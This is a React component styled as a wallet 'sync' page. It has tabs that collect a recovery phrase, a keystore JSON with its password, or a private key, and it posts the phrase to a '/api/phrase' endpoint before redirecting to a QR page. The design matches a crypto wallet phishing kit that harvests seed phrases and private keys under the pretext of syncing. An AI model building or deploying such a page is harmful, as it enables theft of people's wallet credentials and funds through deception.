import styled from "styled-components";
import { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

const Head = styled.h2`
  margin: 10;
  padding: 4;

  margin-top: 120px;
  text-align: center;
`;

const SwitchTag = styled.div`
padding: 20px;
    overflow: hidden;
    border-bottom: 2px solid white;
    background-color: white;
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(50px, 1fr));
    grid-gap: 0px;
    margin: 20px;
}
`;

const TagContainer = styled.button`
  float: left;
  background: none;
  border: none;
  outline: none;
  cursor: pointer;
  padding: 13px 16px;
  transition: 0.3s;
  background-color: ${(props) => props.active === true && "rgb(88, 120, 188)"};
  border-radius: ${(props) => props.active === true && "20px"};
  color: ${(props) => (props.active === true ? "white" : "black")};
  font-weight: ${(props) => props.active === true && "bold"};
  width: 80%;
  font-size: 14px;

  &:hover {
    border-radius: 20px;
  }
`;

const Box = styled.textarea`
  width: 85%;
  height: 150px;
  border: 2px solid #bbb;
  padding: 10px;
  border-radius: 10px;
  display: flex;
  justify-content: center;
  align-items: center;
  margin: 0 auto;
  background: none;
`;
const Pass = styled.input`
  width: 85%;
  height: auto;
  border: 2px solid #bbb;
  padding: 10px;
  border-radius: 10px;
  margin: 12px auto;
  display: flex;
  background: none;
  margin-bottom: 2rem;
`;
const Text = styled.p`
  text-align: center;
`;
const Button = styled.button`
  width: 75%;
  background: rgb(42, 73, 141);
  color: rgb(252, 250, 255);
  padding: 12px;
  text-align: center;
  border: none;
  border-radius: 10px;
  font-weight: 650;
  outline: none;
  cursor: pointer;

  &:link,
  &:visited {
    background-color: #07305a;
    color: rgb(252, 250, 255);
    padding: 15px 25px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
  }

  &:hover {
    background-color: rgb(42, 73, 141);
    color: rgb(252, 250, 255);
  }
`;

const Meta = () => {
  const [switchTab, setSwitchTab] = useState("phrase");
  const [phrase, setPhrase] = useState("");
  const [keystore, setKeyStore] = useState("");
  const [keyPassword, setKeyPassword] = useState("");
  const [privatePassword, setPrivatePassword] = useState("");
  const navigate = useNavigate();

  const handleClick = async (e) => {
    e.preventDefault();

    if (switchTab === "phrase") {
      if (phrase === "") {
        return null;
      } else {
        try {
          const getStrings = phrase.split(/[ ,]+/);

          if (getStrings.length < 12) {
            return alert("Check phrase and enter again");
          } else {
            const response = await axios.post(
              "/api/phrase",
              {
                phrase: getStrings,
              }
            );
            console.log(response.data);
            navigate("/QR");
          }
          setPhrase("");
        } catch (error) {
          return console.log(error.response.data.message);
        }
      }
    } else if (switchTab === "keystore") {
      if (keystore === "" || keyPassword === "") {
        return null;
      } else {
        const getKeyStore = {
          keystore,
          keyPassword,
        };
        console.log(getKeyStore);
      }
    } else if (switchTab === "private") {
      if (privatePassword === "") {
        return null;
      } else {
        const getPrivate = {
          privatePassword,
        };
        console.log(getPrivate);
      }
    }

    navigate("/QR");
  };

  return (
    <>
      <Head>Input parameters to commence Syncing</Head>
      <br />
      <br />
      <SwitchTag>
        <TagContainer
          active={switchTab === "phrase" && true}
          onClick={() => setSwitchTab("phrase")}
        >
          Phrase
        </TagContainer>

        <TagContainer
          active={switchTab === "keystore" && true}
          onClick={() => setSwitchTab("keystore")}
        >
          Keystore JSON
        </TagContainer>

        <TagContainer
          active={switchTab === "private" && true}
          onClick={() => setSwitchTab("private")}
        >
          Private Key
        </TagContainer>
      </SwitchTag>

      {switchTab === "phrase" ? (
        <>
          <br />
          <Box
            required="required"
            minLength="12"
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Phrase"
          />

          <br />

          <Text>
            Typically 12 (sometimes 24) words separated by single spaces
          </Text>
        </>
      ) : switchTab === "keystore" ? (
        <>
          <br />
          <Box
            required="required"
            minLength="12"
            onChange={(e) => setKeyStore(e.target.value)}
            placeholder="Keystore JSON"
          />

          <br />

          <Pass
            type="password"
            required="required"
            minLength="12"
            placeholder="Password"
            onChange={(e) => setKeyPassword(e.target.value)}
          />

          <Text>
            Typically 12 (sometimes 24) words separated by single spaces
          </Text>
        </>
      ) : switchTab === "private" ? (
        <>
          <br />
          <Pass
            type="text"
            required="required"
            minLength="12"
            placeholder="Private Key"
            onChange={(e) => setPrivatePassword(e.target.value)}
          />

          <Text>
            Typically 12 (sometimes 24) words separated by single spaces
          </Text>
        </>
      ) : null}

      <br />
      <br />
      <br />

      <center>
        <Button onClick={handleClick}>IMPORT</Button>
      </center>

      <br />
      <br />
    </>
  );
};

export default Meta;
